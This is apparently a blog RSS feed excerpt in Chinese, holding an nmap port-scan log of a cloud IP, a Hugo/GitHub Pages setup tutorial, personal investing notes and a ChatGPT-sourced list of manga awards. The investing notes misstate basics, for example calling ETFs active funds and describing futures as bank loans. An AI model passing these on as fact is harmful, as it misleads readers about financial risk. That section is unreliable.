&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Completed Ping Scan at 01:49, 0.01s elapsed &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span> total hosts&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Initiating Parallel DNS resolution of &lt;span style="color:#ae81ff">1&lt;/span> host. at 01:49
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Completed Parallel DNS resolution of &lt;span style="color:#ae81ff">1&lt;/span> host. at 01:49, 0.01s elapsed
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Initiating Connect Scan at 01:49
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Scanning 101.5.81.34.bc.googleusercontent.com &lt;span style="color:#f92672">(&lt;/span>34.81.5.101&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#ae81ff">1000&lt;/span> ports&lt;span style="color:#f92672">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Discovered open port 443/tcp on 34.81.5.101
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Discovered open port 80/tcp on 34.81.5.101
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Increasing send delay &lt;span style="color:#66d9ef">for&lt;/span> 34.81.5.101 from &lt;span style="color:#ae81ff">0&lt;/span> to &lt;span style="color:#ae81ff">5&lt;/span> due to &lt;span style="color:#ae81ff">11&lt;/span> out of &lt;span style="color:#ae81ff">14&lt;/span> dropped probes since last increase.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Increasing send delay &lt;span style="color:#66d9ef">for&lt;/span> 34.81.5.101 from &lt;span style="color:#ae81ff">5&lt;/span> to &lt;span style="color:#ae81ff">10&lt;/span> due to &lt;span style="color:#ae81ff">11&lt;/span> out of &lt;span style="color:#ae81ff">11&lt;/span> dropped probes since last increase.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Increasing send delay &lt;span style="color:#66d9ef">for&lt;/span> 34.81.5.101 from &lt;span style="color:#ae81ff">10&lt;/span> to &lt;span style="color:#ae81ff">20&lt;/span> due to &lt;span style="color:#ae81ff">11&lt;/span> out of &lt;span style="color:#ae81ff">11&lt;/span> dropped probes since last increase.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Increasing send delay &lt;span style="color:#66d9ef">for&lt;/span> 34.81.5.101 from &lt;span style="color:#ae81ff">20&lt;/span> to &lt;span style="color:#ae81ff">40&lt;/span> due to &lt;span style="color:#ae81ff">11&lt;/span> out of &lt;span style="color:#ae81ff">15&lt;/span> dropped probes since last increase.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Completed Connect Scan at 01:50, 75.06s elapsed &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">1000&lt;/span> total ports&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Nmap scan report &lt;span style="color:#66d9ef">for&lt;/span> 101.5.81.34.bc.googleusercontent.com &lt;span style="color:#f92672">(&lt;/span>34.81.5.101&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host is up, received syn-ack &lt;span style="color:#f92672">(&lt;/span>0.0085s latency&lt;span style="color:#f92672">)&lt;/span>.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Scanned at 2023-10-02 01:49:05 EDT &lt;span style="color:#66d9ef">for&lt;/span> 75s
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Not shown: &lt;span style="color:#ae81ff">998&lt;/span> filtered tcp ports &lt;span style="color:#f92672">(&lt;/span>no-response&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>PORT STATE SERVICE REASON
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>80/tcp open http syn-ack
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>443/tcp open https syn-ack
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Read data files from: /usr/bin/../share/nmap
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Nmap &lt;span style="color:#66d9ef">done&lt;/span>: &lt;span style="color:#ae81ff">1&lt;/span> IP address &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span> host up&lt;span style="color:#f92672">)&lt;/span> scanned in 75.09 seconds
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::
開的Port: 80/443&lt;/p></description></item><item><title>如何使用Hugo+Github架設網站</title><link>https://bernie6401.github.io/docs/problem-solutions/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8hugo+github%E6%9E%B6%E8%A8%AD%E7%B6%B2%E7%AB%99/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/problem-solutions/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8hugo+github%E6%9E%B6%E8%A8%AD%E7%B6%B2%E7%AB%99/</guid><description>&lt;h1 id="如何使用hugogithub架設網站">
 如何使用Hugo+Github架設網站
 &lt;a class="anchor" href="#%e5%a6%82%e4%bd%95%e4%bd%bf%e7%94%a8hugogithub%e6%9e%b6%e8%a8%ad%e7%b6%b2%e7%ab%99">#&lt;/a>
&lt;/h1>
&lt;p>參考資料: &lt;a href="https://kucw.io/blog/2021/1/from-medium-to-github/">為了 SEO！我離開了 Medium，改在 GitHub 上自架個人網站&lt;/a>&lt;/p>
&lt;h2 id="註冊github-account--create-github-page">
 註冊Github Account &amp;amp; Create Github Page
 &lt;a class="anchor" href="#%e8%a8%bb%e5%86%8agithub-account--create-github-page">#&lt;/a>
&lt;/h2>
&lt;p>參考資料: &lt;a href="https://hackmd.io/@flagmaker/BkvQphP65">使用 GitHub Pages 架設個人網站&lt;/a>&lt;/p>
&lt;h2 id="optional">
 (Optional)
 &lt;a class="anchor" href="#optional">#&lt;/a>
&lt;/h2>
&lt;p>參考資料: &lt;a href="https://medium.com/zrealm-ios-dev/github-pages-%E8%87%AA%E8%A8%82%E7%B6%B2%E5%9F%9F%E6%95%99%E5%AD%B8-483af5d93297">Github Pages 自訂網域教學&lt;/a>&lt;/p>
&lt;h2 id="hugo-step">
 Hugo Step
 &lt;a class="anchor" href="#hugo-step">#&lt;/a>
&lt;/h2>
&lt;p>參考資料: &lt;a href="https://sean22492249.medium.com/%E4%BD%BF%E7%94%A8-hugo-%E5%9C%A8-github-%E9%83%A8%E7%BD%B2%E5%80%8B%E4%BA%BA%E7%B6%B2%E7%AB%99-5b2ff19f8b6">使用 Hugo 在 github 部署個人網站&lt;/a>&lt;/p>
&lt;h3 id="安裝hugolatest-version">
 安裝Hugo(latest version)
 &lt;a class="anchor" href="#%e5%ae%89%e8%a3%9dhugolatest-version">#&lt;/a>
&lt;/h3>
&lt;ol>
&lt;li>在&lt;a href="https://github.com/gohugoio/hugo/releases">Github Release&lt;/a>可以找到符合自己需求的版本，目前我是選&lt;code>0.145.0_windows_amd64&lt;/code>&lt;/li>
&lt;li>解壓縮到&lt;code>C:\hugo\bin&lt;/code>&lt;/li>
&lt;li>設定環境變數，設定完後測試
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ hugo version
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>hugo v0.145.0-666444f0a52132f9fec9f71cf25b441cc6a4f355 windows/amd64 BuildDate&lt;span style="color:#f92672">=&lt;/span>2025-02-26T15:41:25Z VendorInfo&lt;span style="color:#f92672">=&lt;/span>gohugoio
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ol>
&lt;h3 id="deploy-website-on-local">
 Deploy Website on Local
 &lt;a class="anchor" href="#deploy-website-on-local">#&lt;/a>
&lt;/h3>
&lt;ol>
&lt;li>Create New Site
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ hugo new site demo
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Congratulations! Your new Hugo site was created in D:&lt;span style="color:#ae81ff">\L&lt;/span>ife&lt;span style="color:#ae81ff">\W&lt;/span>ebsite&lt;span style="color:#ae81ff">\d&lt;/span>emo.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Just a few more steps...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>1. Change the current directory to D:&lt;span style="color:#ae81ff">\L&lt;/span>ife&lt;span style="color:#ae81ff">\W&lt;/span>ebsite&lt;span style="color:#ae81ff">\d&lt;/span>emo.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>2. Create or install a theme:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> - Create a new theme with the command &lt;span style="color:#e6db74">&amp;#34;hugo new theme &amp;lt;THEMENAME&amp;gt;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> - Or, install a theme from https://themes.gohugo.io/
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>3. Edit hugo.toml, setting the &lt;span style="color:#e6db74">&amp;#34;theme&amp;#34;&lt;/span> property to the theme name.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>4. Create new content with the command &lt;span style="color:#e6db74">&amp;#34;hugo new content &amp;lt;SECTIONNAME&amp;gt;\&amp;lt;FILENAME&amp;gt;.&amp;lt;FORMAT&amp;gt;&amp;#34;&lt;/span>.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>5. Start the embedded web server with the command &lt;span style="color:#e6db74">&amp;#34;hugo server --buildDrafts&amp;#34;&lt;/span>.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>See documentation at https://gohugo.io/.
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>選擇Hugo Theme並且更新toml File
到Hugo的&lt;a href="https://themes.gohugo.io/">Official Demo Theme&lt;/a>看哪一個theme適合自己，假設我選擇relearn這個theme，就點選Download
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ cd ./demo
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ git submodule add https://github.com/McShelby/hugo-theme-relearn.git themes/relearn &lt;span style="color:#75715e"># 因為我是用relearn這個theme所以URL和folder name是customize&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 也可以直接下載zip file，不過下面在設定toml file有一個地方要修改&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ echo theme &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;relearn&amp;#39;&lt;/span>&amp;gt;&amp;gt; hugo.toml &lt;span style="color:#75715e"># For CMD&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ echo &lt;span style="color:#e6db74">&amp;#34;theme = &amp;#39;relearn&amp;#39;&amp;#34;&lt;/span> &amp;gt;&amp;gt; hugo.toml &lt;span style="color:#75715e"># For linux&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>這個toml檔案就是一個config file，所以描述網站的最基本資訊&lt;/li>
&lt;li>新增一個測試的檔案
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ hugo new posts/hello.md
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ cat ./content/posts/hello.md
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>+++
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>date &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;2025-04-02T19:15:29+08:00&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>draft &lt;span style="color:#f92672">=&lt;/span> true
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>title &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;Hello&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>+++
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>hugo會在&lt;code>./demo/content/posts&lt;/code>的地方新增一個hello.md這個檔案，並且把draft property改成false，最後deploy之後才會顯示&lt;/li>
&lt;li>Deploy Local Server
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ hugo server
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Watching &lt;span style="color:#66d9ef">for&lt;/span> changes in D:&lt;span style="color:#ae81ff">\L&lt;/span>ife&lt;span style="color:#ae81ff">\W&lt;/span>ebsite&lt;span style="color:#ae81ff">\d&lt;/span>emo&lt;span style="color:#ae81ff">\{&lt;/span>archetypes,assets,content,data,i18n,layouts,static,themes&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Watching &lt;span style="color:#66d9ef">for&lt;/span> config changes in D:&lt;span style="color:#ae81ff">\L&lt;/span>ife&lt;span style="color:#ae81ff">\W&lt;/span>ebsite&lt;span style="color:#ae81ff">\d&lt;/span>emo&lt;span style="color:#ae81ff">\h&lt;/span>ugo.toml, D:&lt;span style="color:#ae81ff">\L&lt;/span>ife&lt;span style="color:#ae81ff">\W&lt;/span>ebsite&lt;span style="color:#ae81ff">\d&lt;/span>emo&lt;span style="color:#ae81ff">\t&lt;/span>hemes&lt;span style="color:#ae81ff">\r&lt;/span>elearn&lt;span style="color:#ae81ff">\h&lt;/span>ugo.toml
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Start building sites …
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>hugo v0.145.0-666444f0a52132f9fec9f71cf25b441cc6a4f355 windows/amd64 BuildDate&lt;span style="color:#f92672">=&lt;/span>2025-02-26T15:41:25Z VendorInfo&lt;span style="color:#f92672">=&lt;/span>gohugoio
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> | EN
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-------------------+-----
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Pages | &lt;span style="color:#ae81ff">11&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Paginator pages | &lt;span style="color:#ae81ff">0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Non-page files | &lt;span style="color:#ae81ff">0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Static files | &lt;span style="color:#ae81ff">0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Processed images | &lt;span style="color:#ae81ff">0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Aliases | &lt;span style="color:#ae81ff">0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Cleaned | &lt;span style="color:#ae81ff">0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Built in &lt;span style="color:#ae81ff">163&lt;/span> ms
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Environment: &lt;span style="color:#e6db74">&amp;#34;development&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Serving pages from disk
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Running in Fast Render Mode. For full rebuilds on change: hugo server --disableFastRender
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Web Server is available at http://localhost:1313/ &lt;span style="color:#f92672">(&lt;/span>bind address 127.0.0.1&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Press Ctrl+C to stop
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;img src="https://hackmd.io/_uploads/SkoITccp1e.png" alt="圖片" />
現在Local的deployment已經完成，剩下的就是deploy到Github Page&lt;/li>
&lt;/ol>
&lt;h2 id="利用github-action-deploy-hugo">
 利用Github Action Deploy Hugo
 &lt;a class="anchor" href="#%e5%88%a9%e7%94%a8github-action-deploy-hugo">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>如果沒有碰過github action的人可能要先熟悉一下，這東西就是github的自動化流程，網路上有很多種action script，應該大同小異，我是用&lt;a href="https://github.com/peaceiris/actions-gh-pages#getting-started">peaceiris/actions-gh-pages&lt;/a>&lt;/p></description></item><item><title>投資理財</title><link>https://bernie6401.github.io/docs/knowledge/%E6%8A%95%E8%B3%87%E7%90%86%E8%B2%A1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/knowledge/%E6%8A%95%E8%B3%87%E7%90%86%E8%B2%A1/</guid><description>&lt;h1 id="投資理財">
 投資理財
 &lt;a class="anchor" href="#%e6%8a%95%e8%b3%87%e7%90%86%e8%b2%a1">#&lt;/a>
&lt;/h1>
&lt;h2 id="基金">
 基金
 &lt;a class="anchor" href="#%e5%9f%ba%e9%87%91">#&lt;/a>
&lt;/h2>
&lt;p>有主動和被動兩種，主要差別在於前者是利用投資客的錢再去投資，並且資產分配的很即時迅速，例如這個月的科技股看漲，那基金經理人就會多分配一點在科技股，而下個月可能多分配一點在民生相關的股票，積極程度是高的，ETF就是主動型基金；後者主要是一段時間之後，投資的資產配置才會更新。前者的優點是獲利較高(相對來說)但風險也較大，後者就相反&lt;/p>
&lt;h2 id="期貨">
 期貨
 &lt;a class="anchor" href="#%e6%9c%9f%e8%b2%a8">#&lt;/a>
&lt;/h2>
&lt;p>就是跟別人借錢買標的，這樣自己出的錢就比較少，標的後續上漲後，獲利就會超乎想像的高，也就是類似開了槓桿，舉例來說，有一檔股票現值100元，我可以只用30元就買到，其他70元是銀行幫我出，如果之後這一檔股票漲到130元，我的獲利就是$(130-100)/30&lt;em>100%=100%$，但如果我不是用期貨的方式買，而是一個傳統的交易模式，獲利就會是$(130-100)/100&lt;/em>100%=30%$，相比於利用期貨的方式會少非常多，但以上久只建立在後續上漲的情況，如果之後不幸跌了，那就代表要賠的錢也是超乎想像的多&lt;/p>
&lt;p>另外，期貨也有分兩種玩法，做多和做空，意思是我認為目前的標的會上漲那我就買做多，也就是假設標的有漲我就賺錢，相反如果我認為目前標的會下跌，那我就買做空，假設最後真的下跌了，那我也賺錢，就是買對於未來的預測，換言之，如果我買做空但最後上漲，那我就賠錢&lt;/p>
&lt;h2 id="當沖">
 當沖
 &lt;a class="anchor" href="#%e7%95%b6%e6%b2%96">#&lt;/a>
&lt;/h2>
&lt;p>簡單說就是當天買當天賣，也就是短時間內，利用放大自己的本金達到高回報的方式，但需要大心臟，因為市場的變化太劇烈，在不對的時間賣出去，可能會損失很多。可能有人會想那我就只要投資那些長期不太會疊的標的就好啦，例如&lt;/p>
&lt;h2 id="對沖">
 對沖
 &lt;a class="anchor" href="#%e5%b0%8d%e6%b2%96">#&lt;/a>
&lt;/h2>
&lt;p>如果有一檔股票或基金我認為長期看漲(例如現在的0050)，所以我買進，但現在可能因為市場波動造成現階段下跌，但我又不想要把現有的資產賣出，要怎麼做才能不要損失呢?&lt;/p>
&lt;p>那就是利用對衝和期貨(或勸證、借券都可以)的做多做空的概念，具體來說，現階段0050持續下跌，那我可以買期貨的做空，並且控制兩者損益是一樣的，那如果最後0050真的下跌了，雖然原本手上的資產賠錢，但我的買的做空期貨是賺錢的，兩者損益為0，就可以很好的達到&amp;quot;對沖&amp;quot;的效果，讓原本只會賠錢的資產有凍結的效果。&lt;/p>
&lt;p>假設我認為目前標的看漲，我買期貨做多，而最後也真的上漲，那我就賺2倍，相反的
假設我認為目前標的看漲，我買期貨做多，但最後卻下跌了，那我就虧2倍，風險也是不小&lt;/p>
&lt;h2 id="債券--國債">
 債券 &amp;amp; 國債
 &lt;a class="anchor" href="#%e5%82%b5%e5%88%b8--%e5%9c%8b%e5%82%b5">#&lt;/a>
&lt;/h2>
&lt;p>簡單來說就是發行者(可能是公司也可能是國家政府)像其他人借錢，之後再支付一定比例的利息，而該利息比我放定存還要高&lt;/p>
&lt;h2 id="外幣匯率">
 外幣匯率
 &lt;a class="anchor" href="#%e5%a4%96%e5%b9%a3%e5%8c%af%e7%8e%87">#&lt;/a>
&lt;/h2>
&lt;p>其實就是賺匯差，如果我在去年買日幣，今年在賣出的話就可以賺匯差，因為今年日幣升值，例如2024/7的匯率是台幣:日幣=0.2:1，而現在2025/3的匯率是0.22:1，如果去年我買10000日圓的話那相當於2000台幣，而現在如果賣掉就是賺200元，獲利就是$(2200-2000)/2000*100%=10%$&lt;/p>
&lt;h2 id="衍生性商品">
 衍生性商品
 &lt;a class="anchor" href="#%e8%a1%8d%e7%94%9f%e6%80%a7%e5%95%86%e5%93%81">#&lt;/a>
&lt;/h2>
&lt;p>From GPT
**衍生性金融商品（Derivatives）&lt;strong>是一類金融工具，其價值來自於某種&lt;/strong>標的資產（Underlying Asset）**的價格變動。這些標的資產可以是股票、指數、外匯、大宗商品（如黃金、石油）、利率、甚至是比特幣等數位資產。&lt;/p>
&lt;h3 id="-衍生性商品的特點">
 🔹 &lt;strong>衍生性商品的特點&lt;/strong>
 &lt;a class="anchor" href="#-%e8%a1%8d%e7%94%9f%e6%80%a7%e5%95%86%e5%93%81%e7%9a%84%e7%89%b9%e9%bb%9e">#&lt;/a>
&lt;/h3>
&lt;ol>
&lt;li>&lt;strong>價格來自標的資產&lt;/strong>：衍生性商品本身沒有內在價值，它的價格是由標的資產的市場價格變動決定的。&lt;/li>
&lt;li>&lt;strong>槓桿效果&lt;/strong>：通常可以用較少的資金控制更大的市場部位，但同時風險也較高。&lt;/li>
&lt;li>&lt;strong>可以用來避險或投機&lt;/strong>：許多投資者使用衍生性商品來對沖（Hedging）風險，或者進行高槓桿投機（Speculation）。&lt;/li>
&lt;li>&lt;strong>可做多也可做空&lt;/strong>：不像股票只能買進再賣出，衍生性商品通常允許投資者同時做多或做空市場。&lt;/li>
&lt;/ol>
&lt;hr>
&lt;h3 id="-常見的衍生性商品種類">
 🔹 &lt;strong>常見的衍生性商品種類&lt;/strong>
 &lt;a class="anchor" href="#-%e5%b8%b8%e8%a6%8b%e7%9a%84%e8%a1%8d%e7%94%9f%e6%80%a7%e5%95%86%e5%93%81%e7%a8%ae%e9%a1%9e">#&lt;/a>
&lt;/h3>
&lt;ol>
&lt;li>
&lt;p>&lt;strong>期貨（Futures）&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>合約約定在未來某個時間，以約定價格買入或賣出標的資產。&lt;/li>
&lt;li>例如：原油期貨、黃金期貨、比特幣期貨。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>選擇權（Options）&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>給予買方在未來某個時間，以約定價格買入（買權，Call）或賣出（賣權，Put）標的資產的權利（但不強制執行）。&lt;/li>
&lt;li>例如：台指選擇權、特斯拉股票選擇權。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>差價合約（CFD, Contract for Difference）&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>不需持有標的資產，只需根據價格變動來賺取價差，可做多或做空。&lt;/li>
&lt;li>例如：CFD 外匯交易、CFD 黃金交易。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>權證（Warrants）&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>類似選擇權，但由發行公司（通常是銀行）提供，槓桿較大，交易方式較簡單。&lt;/li>
&lt;li>例如：台灣股市的認購權證、認售權證。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>互換（Swaps）&lt;/strong>&lt;/p></description></item><item><title>日本知名的漫畫相關獎項</title><link>https://bernie6401.github.io/docs/knowledge/%E6%97%A5%E6%9C%AC%E7%9F%A5%E5%90%8D%E7%9A%84%E6%BC%AB%E7%95%AB%E7%9B%B8%E9%97%9C%E7%8D%8E%E9%A0%85/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/knowledge/%E6%97%A5%E6%9C%AC%E7%9F%A5%E5%90%8D%E7%9A%84%E6%BC%AB%E7%95%AB%E7%9B%B8%E9%97%9C%E7%8D%8E%E9%A0%85/</guid><description>&lt;h1 id="日本知名的漫畫相關獎項">
 日本知名的漫畫相關獎項
 &lt;a class="anchor" href="#%e6%97%a5%e6%9c%ac%e7%9f%a5%e5%90%8d%e7%9a%84%e6%bc%ab%e7%95%ab%e7%9b%b8%e9%97%9c%e7%8d%8e%e9%a0%85">#&lt;/a>
&lt;/h1>
&lt;p>From ChatGPT&lt;/p>
&lt;h3 id="-綜合性漫畫大獎">
 &lt;strong>📖 綜合性漫畫大獎&lt;/strong>
 &lt;a class="anchor" href="#-%e7%b6%9c%e5%90%88%e6%80%a7%e6%bc%ab%e7%95%ab%e5%a4%a7%e7%8d%8e">#&lt;/a>
&lt;/h3>
&lt;h4 id="1-手塚治虫文化獎手塚治虫文化賞">
 &lt;strong>1. 手塚治虫文化獎（手塚治虫文化賞）&lt;/strong>
 &lt;a class="anchor" href="#1-%e6%89%8b%e5%a1%9a%e6%b2%bb%e8%99%ab%e6%96%87%e5%8c%96%e7%8d%8e%e6%89%8b%e5%a1%9a%e6%b2%bb%e8%99%ab%e6%96%87%e5%8c%96%e8%b3%9e">#&lt;/a>
&lt;/h4>
&lt;ul>
&lt;li>&lt;strong>主辦單位&lt;/strong>：朝日新聞社&lt;/li>
&lt;li>&lt;strong>創立時間&lt;/strong>：1997年&lt;/li>
&lt;li>&lt;strong>特色&lt;/strong>：以「漫畫界的諾貝爾獎」著稱，表彰具有藝術性、創新性與影響力的作品。&lt;/li>
&lt;li>&lt;strong>主要獎項&lt;/strong>：
&lt;ul>
&lt;li>大獎&lt;/li>
&lt;li>新生獎（表彰新銳漫畫家）&lt;/li>
&lt;li>短篇獎（短篇或單冊完結作品）&lt;/li>
&lt;li>特別獎（對漫畫界有貢獻者）&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;hr>
&lt;h4 id="2-文化廳媒體藝術祭漫畫部門文化庁メディア芸術祭">
 &lt;strong>2. 文化廳媒體藝術祭漫畫部門（文化庁メディア芸術祭）&lt;/strong>
 &lt;a class="anchor" href="#2-%e6%96%87%e5%8c%96%e5%bb%b3%e5%aa%92%e9%ab%94%e8%97%9d%e8%a1%93%e7%a5%ad%e6%bc%ab%e7%95%ab%e9%83%a8%e9%96%80%e6%96%87%e5%8c%96%e5%ba%81%e3%83%a1%e3%83%87%e3%82%a3%e3%82%a2%e8%8a%b8%e8%a1%93%e7%a5%ad">#&lt;/a>
&lt;/h4>
&lt;ul>
&lt;li>&lt;strong>主辦單位&lt;/strong>：日本文化廳&lt;/li>
&lt;li>&lt;strong>創立時間&lt;/strong>：1997年&lt;/li>
&lt;li>&lt;strong>特色&lt;/strong>：不僅表彰漫畫，也涵蓋動畫、遊戲、數位藝術等，著重於藝術性與創新性。&lt;/li>
&lt;li>&lt;strong>獎項類別&lt;/strong>：
&lt;ul>
&lt;li>&lt;strong>大獎&lt;/strong>&lt;/li>
&lt;li>&lt;strong>優秀獎&lt;/strong>&lt;/li>
&lt;li>&lt;strong>新人獎&lt;/strong>&lt;/li>
&lt;li>&lt;strong>審查委員會推薦作品&lt;/strong>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;hr>
&lt;h4 id="3-日本漫畫家協會獎日本漫画家協会賞">
 &lt;strong>3. 日本漫畫家協會獎（日本漫画家協会賞）&lt;/strong>
 &lt;a class="anchor" href="#3-%e6%97%a5%e6%9c%ac%e6%bc%ab%e7%95%ab%e5%ae%b6%e5%8d%94%e6%9c%83%e7%8d%8e%e6%97%a5%e6%9c%ac%e6%bc%ab%e7%94%bb%e5%ae%b6%e5%8d%94%e4%bc%9a%e8%b3%9e">#&lt;/a>
&lt;/h4>
&lt;ul>
&lt;li>&lt;strong>主辦單位&lt;/strong>：日本漫畫家協會&lt;/li>
&lt;li>&lt;strong>創立時間&lt;/strong>：1972年&lt;/li>
&lt;li>&lt;strong>特色&lt;/strong>：由漫畫家組織評選，表彰對漫畫界有貢獻的作品。&lt;/li>
